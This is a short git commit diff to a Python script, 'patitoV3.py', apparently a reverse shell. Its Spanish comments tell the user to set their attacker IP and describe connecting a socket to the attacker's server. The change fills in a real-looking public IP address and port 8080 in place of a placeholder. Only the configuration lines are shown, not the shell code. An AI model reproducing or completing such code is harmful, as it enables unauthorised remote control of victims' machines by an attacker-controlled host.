d904bbec8a7fd9f4001f35cf15c1bf363cd2ca1a
G-Puy <74050873+G-Puy@users.noreply.github.com>
2024-12-15 17:37:08 -0300

    Update patitoV3.py

--- patitoV3.py
+++ patitoV3.py
@@ -4,7 +4,7 @@ import subprocess
 import os
 
 # Configura tu IP y puerto aquí
-IP = "5"  # Cambia a tu IP atacante
+IP = "167.60.62.81"  # Cambia a tu IP atacante
 PORT = 8080  # Cambia al puerto que deseas usar
 
 # Crea un socket y se conecta al servidor atacante
